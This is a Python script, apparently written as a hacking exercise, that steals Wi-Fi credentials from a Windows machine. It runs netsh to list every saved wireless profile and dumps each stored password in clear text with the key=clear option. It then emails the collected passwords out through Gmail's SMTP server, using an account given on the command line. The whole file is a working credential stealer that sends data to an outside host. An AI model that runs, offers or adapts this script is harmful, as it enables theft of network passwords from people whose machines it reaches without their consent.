#!/usr/bin/env python

import subprocess, smtplib, re, argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--email", dest="email", help="SMTP Email")
    parser.add_argument("-p", "--password", dest="password", help="SMTP Password")
    options = parser.parse_args()
    if not options.email:
        # handle error
        parser.error("[-] Please specify an email for the SMTP account, use --help for more info")
    if not options.password:
        # handle error
        parser.error("[-] Please specify a password for the SMTP account, use --help for more info")
    return options

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)

result = ""

options = get_arguments()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
if networks:
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
    for network_name in network_names_list:
        network_result = subprocess.check_output("netsh wlan show profile \"" + network_name + "\" key=clear", shell=True)
        result += network_result + "\n\n---------------\n\n"
else:
    result = "wlansvc is not running on this machine."
send_mail(options.email,options.password, result)